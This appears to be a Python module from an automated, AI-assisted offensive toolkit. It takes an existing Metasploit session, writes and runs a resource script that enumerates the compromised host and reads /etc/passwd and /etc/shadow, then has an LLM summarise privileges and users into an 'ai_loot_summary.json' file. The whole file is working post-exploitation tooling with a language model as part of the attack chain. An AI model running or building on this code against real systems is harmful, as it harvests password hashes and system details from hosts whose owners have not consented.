import os
import sys
import subprocess
import json

sys.path.insert(0, os.path.abspath(os.path.join(os.getcwd(), "tools")))
from llm_wrapper import use_llm

def build_post_rc(session_id, run_path):
    lines = [
        f"sessions -i {session_id}",
        "getuid",
        "id",
        "whoami",
        "uname -a",
        "ip a",
        "cat /etc/passwd",
        "cat /etc/shadow",
        "sessions -K",
        "exit"
    ]
    rc_path = os.path.join(run_path, "post.rc")
    with open(rc_path, "w") as f:
        f.write("\n".join(lines))
    return rc_path

def run_post_rc(rc_path, run_path):
    output_file = os.path.join(run_path, "meterpreter.txt")
    result = subprocess.run(
        ["msfconsole", "-q", "-r", rc_path],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        stdin=subprocess.DEVNULL,
        text=True,
        timeout=180
    )
    with open(output_file, "w") as f:
        f.write(result.stdout)
    return result.stdout

def run(target, run_path):
    sid_path = os.path.join(run_path, "session_ids.txt")
    if not os.path.exists(sid_path):
        print("[!] No session_ids.txt file found.")
        return

    sid = open(sid_path).read().strip().split(",")[0]
    rc = build_post_rc(sid, run_path)
    output = run_post_rc(rc, run_path)

    prompt = f"""Analyze this shell output for privilege level, users, system info:

{output[:4000]}

ONLY RETURN VALID JSON. Example:
{{"privilege":"root","users":["user1","user2"],"system_info":"Linux version 5.x..."}}
"""

    response = use_llm("post_analysis", prompt)
    try:
        analysis = json.loads(response.strip().split("\n")[-1])
    except json.JSONDecodeError:
        analysis = {
            "privilege": "unknown",
            "users": [],
            "system_info": f"LLM parse error: {response[:200]}"
        }

    summary_path = os.path.join(run_path, "ai_loot_summary.json")
    with open(summary_path, "w") as f:
        json.dump(analysis, f, indent=2)

    print(f"[✓] Post-exploitation analysis saved to {summary_path}")

if __name__ == "__main__":
    t = os.getenv("RECON_KI_TARGET")
    p = os.getenv("RECON_KI_RUN_PATH")
    if not t or not p:
        exit(1)
    run(t, p)
